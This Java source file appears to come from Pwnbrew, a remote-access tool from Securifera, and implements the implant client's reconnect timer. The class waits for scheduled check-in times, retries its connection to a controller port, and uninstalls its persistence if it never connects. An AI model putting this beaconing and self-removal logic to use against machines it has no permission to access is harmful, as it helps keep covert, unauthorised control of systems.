/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  ReconnectTimer.java
 *
 *  Created on June 7, 2013
 */

package pwnbrew.misc;

import java.io.IOException;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.Persistence;
import pwnbrew.concurrent.LockListener;
import pwnbrew.log.RemoteLog;
import pwnbrew.log.LoggableException;
import pwnbrew.manager.CommManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.control.ControlMessageManager;

/**
 *
 *  
 */
public class ReconnectTimer extends ManagedRunnable implements LockListener {
    
    private CommManager theCommManager = null;
    
    //Static instance
    private static ReconnectTimer theTimer = null;
    private final Queue<String> theReconnectTimeList = new LinkedList<>();
    
    private int lockVal = 0;
    
    private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
           

    // ==========================================================================
    /**
     * Constructor
     *
    */
    private ReconnectTimer() {
        super(Constants.Executor);
    }
    
    // ==========================================================================
    /**
     *   Ensures that there is only ever one DetectionManager instance
     * @return 
     */
    public synchronized static ReconnectTimer getReconnectTimer() {

        if( theTimer == null ) {
            theTimer = new ReconnectTimer();
        }
        
        return theTimer;

    }/* END getReconnectTimer() */
    
     
    // ==========================================================================
    /**
     *   Sets the detector provider
     * @param passedProvider
    */
    public synchronized void setCommManager( CommManager passedProvider ) {

        if( passedProvider != null ){
            theCommManager = passedProvider;       
        }
        
    }/* END setDetectorProvider() */

    // ==========================================================================
    /**
     *  Main thread loop
     *
    */
    @Override
    public void go() {
        
        boolean connected = false;
        try {                 
            
            Calendar theCalendar = Calendar.getInstance(); 
            theCalendar.setTime( new Date() );
            theCalendar.add(Calendar.SECOND, 5 );
            Date theDate;
            
            while( !connected && !shutdownRequested ){
            
                String reconnectTime;
                synchronized(theReconnectTimeList){
                    reconnectTime = theReconnectTimeList.poll();
                }
                
                //Get the reconnect time from the list
                if( reconnectTime != null ){

                    try {
                        theDate = Constants.CHECKIN_DATE_FORMAT.parse( reconnectTime ); 
                    } catch (NumberFormatException ex ){
                        ex = null;
                        continue;
                    } 
                    
                    //check if the time is before now
                    Calendar anotherCalendar = Calendar.getInstance(); 
                    anotherCalendar.setTime( theDate );
                    if( anotherCalendar.before( new Date())){                        
                        //Initialize the time
                        continue;                   
                    }                   
                    
                } else {
                    
                   //Get current time
                   DebugPrinter.printMessage(NAME_Class, "No time set.");
                   theDate = theCalendar.getTime();
                }        
            
                //Wait till a certain time
                if( theDate != null ){
                    
                    waitUntil(theDate);  
                    try {
                        
                        //Get the socket router
                        int thePort = ClientConfig.getConfig().getSocketPort();
                        ClientPortRouter aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );

                        //Initiate the file transfer
                        if(aPR == null){
                            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
                            if( aCMManager == null ){
                                aCMManager = ControlMessageManager.initialize( theCommManager );
                            }
                            
                            aPR = (ClientPortRouter) theCommManager.getPortRouter( thePort );
                            if(aPR == null)
                                return;
                            
                        }

                        //Create the connection
                        connected = aPR.ensureConnectivity( thePort, this );                          
                        

                    } catch ( IOException | LoggableException ex) {
                        RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
                    }
                   
                } else  {
                    break;
                }
                
            }
            
        } catch (ParseException ex) {
            RemoteLog.log(Level.SEVERE, NAME_Class, "start()", ex.getMessage(), ex);
        }
        
        //Uninstall
        if( !connected ){
            
            //Uninstall
            Persistence.uninstall( (CommManager)theCommManager);    
            
        } else {            
            theReconnectTimeList.clear();
        }
        
    }
    
    // ==========================================================================
    /**
     *  Wait until a certain date to reconnect
     * 
     * @param date 
     */
    private void waitUntil(Date date) {
        
        final Object syncedObject = new Object();
        TimerTask aTimerTask = new TimerTask() {
            @Override
            public void run() {
                synchronized (syncedObject) {
                    syncedObject.notify();
                }
            }
        };
        
        DebugPrinter.printMessage(NAME_Class, "Trying to connect again at " + date.toString());
        //Create a timer
        Timer aTimer = new Timer();
        aTimer.schedule(aTimerTask, date);
        synchronized(syncedObject) {
            try {
                syncedObject.wait();
            } catch (InterruptedException ie) {}
        }
        aTimer.cancel();
        aTimer.purge();
    }

    // ==========================================================================
    /**
     *  Sets the delay to wait before trying to connect.
     * 
     * @param passedTime 
    */
    public void addReconnectTime( String passedTime ) {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.add( passedTime );
        }
    }
    
     
     //===============================================================
    /**
     * 
     * @param lockOp 
     */
    @Override
    public synchronized void lockUpdate(int lockOp) {
        lockVal = lockOp;
        notifyAll();
    }
    
    //===============================================================
    /**
     * 
     * @return  
     */
    @Override
    public synchronized int waitForLock() {
        
        int retVal;        
        while( lockVal == 0 && !shutdownRequested){
            try {
                wait();
            } catch (InterruptedException ex) {
            }
        }
        
        //Set to temp and reset
        retVal = lockVal;
        lockVal = 0;
        
        return retVal;
    }

    //===============================================================
    /**
     * 
     */
    public void clearTimes() {
        synchronized(theReconnectTimeList){
            theReconnectTimeList.clear();
        }
    }

}
